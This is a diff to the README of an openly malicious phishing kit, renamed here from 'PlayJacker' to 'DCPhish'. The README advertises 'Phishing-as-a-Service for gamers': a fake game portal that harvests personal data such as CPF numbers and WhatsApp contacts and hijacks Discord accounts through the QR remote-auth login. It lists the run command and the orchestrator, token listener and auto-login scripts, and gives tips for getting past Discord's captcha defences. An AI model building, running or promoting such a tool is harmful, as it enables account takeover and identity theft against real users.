@@ -1,16 +1,16 @@
-# 🎮 PlayJacker
+# 🎣 DCPhish
 
 **Phishing-as-a-Service for gamers.** A fake game portal that harvests PII (name, birth date, CPF, e-mail, WhatsApp) and hijacks Discord accounts through the official **QR Login (remote-auth)** flow — then drops you straight into the victim's session in your own browser.
 
 > One command. Public link. Captured token → auto-logged browser.
 
 ```
- ██████╗ ██╗      █████╗ ██╗   ██╗     ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗
- ██╔══██╗██║     ██╔══██╗╚██╗ ██╔╝     ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
- ██████╔╝██║     ███████║ ╚████╔╝      ██║███████║██║     █████╔╝ █████╗  ██████╔╝
- ██╔═══╝ ██║     ██╔══██║  ╚██╔╝  ██   ██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
- ██║     ███████╗██║  ██║   ██║   ╚█████╔╝██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
- ╚═╝     ╚══════╝╚═╝  ╚═╝   ╚═╝    ╚════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+ ██████╗  ██████╗ ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
+ ██╔══██╗██╔════╝ ██╔══██╗██║  ██║██║██╔════╝██║  ██║
+ ██║  ██║██║      ██████╔╝███████║██║███████╗███████║
+ ██║  ██║██║      ██╔═══╝ ██╔══██║██║╚════██║██╔══██║
+ ██████╔╝╚██████╗ ██║     ██║  ██║██║███████║██║  ██║
+ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
 ```
 
 ---
@@ -58,7 +58,7 @@ python -m playwright install chromium
 # 2. (optional) pick your own ntfy topic in config.py
 
 # 3. GO
-python playjacker.py
+python dcphish.py
 ```
 
 The orchestrator prints the public link (and a shortened one as a bonus):
@@ -84,7 +84,7 @@ The orchestrator prints the public link (and a shortened one as a bonus):
 
 | File | Role |
 |---|---|
-| `playjacker.py` | Orchestrator: portal + tunnel + short link + listener, all in one |
+| `dcphish.py` | Orchestrator: portal + tunnel + short link + listener, all in one |
 | `server.py` | Portal + remote-auth engine (RSA-OAEP, ticket exchange, captcha flow) |
 | `listener.py` | ntfy subscriber → auto-login in Chromium (iframe trick, retries) |
 | `open_now.py` | Open a browser session with the latest token in `tokens.txt` |
@@ -93,7 +93,7 @@ The orchestrator prints the public link (and a shortened one as a bonus):
 
 ## 🔧 Notes
 
-- The quick tunnel link changes on every run — restart `playjacker.py` for a fresh one
+- The quick tunnel link changes on every run — restart `dcphish.py` for a fresh one
 - Discord flags IPs after many remote-auth logins: expect `captcha-required`; the built-in captcha page handles it
 - Free URL shorteners are hijacked by some mobile carriers — the raw tunnel link always works
 
